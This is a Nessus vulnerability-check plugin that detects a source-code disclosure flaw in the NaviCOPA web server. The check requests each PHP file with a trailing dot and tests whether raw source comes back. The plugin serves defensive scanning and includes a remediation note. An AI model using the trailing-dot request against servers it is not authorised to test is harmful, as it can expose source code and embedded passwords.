#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(35588);
  script_version("$Revision: 1.11 $");

  script_bugtraq_id(33585);
  script_xref(name:"EDB-ID", value:"7966");
  script_xref(name:"Secunia", value:"33766");

  script_name(english:"NaviCOPA Trailing Dot Source Code Disclosure");
  script_summary(english:"Tries to read source of scripts");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of the NaviCOPA web server software running on the remote
host returns the source of scripts hosted on it if the URL ends in a
dot ('.').  A remote attacker can leverage this issue to view the
source code of CGIs and possibly obtain passwords and other sensitive
information from this host." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/500626/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to NaviCOPA 3.01 from 6th February 2009 or later as that
reportedly addresses the issue." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/02/05");
 script_cvs_date("$Date: 2015/09/24 21:17:13 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!get_port_state(port)) exit(0);

# NB: we need this when testing NaviCOPA. :-)
disable_cookiejar();


# Unless we're paranoid, make sure the banner looks like NaviCOPA.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: InterVations NaviCOPA" >!< banner) exit(0);
}


# NB: check a couple of files in case some don't contain any PHP code
#     or include it in the generated output.
max_files = 5;
files = get_kb_list(string("www/", port, "/content/extensions/php"));
if (isnull(files)) files = make_list("/index.php");

n = 0;
foreach file (files)
{
  ++n;

  # Try to exploit the issue.
  url = string(file, ".");
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res) || isnull(res[2])) exit(0);

  # nb: we need to remove CRs to be able to anchor regex to end of line.
  res[2] = str_replace(find:'\r\n', replace:'\n', string:res[2]);

  # If it looks like PHP source...
  if (
    "Content-Type: text/plain" >< res[1] &&
    "?>" >< res[2] &&
    egrep(pattern:"<\?(php|=)( |$)", string:res[2])
  )
  {
    res2 = http_send_recv3(method:"GET", item:file, port:port);
    if (isnull(res2)) exit(0);

    if (!egrep(pattern:"<\?(php|=)( |$)", string:res2[2]))
    {
      if (report_verbosity > 0)
      {
        report = string(
          "\n",
          "Nessus was able to retrieve the source of '", file, "' using\n",
          "the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );

        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "Here it is :\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            res[2],
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }

        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }

  if (n > max_files) break;
}
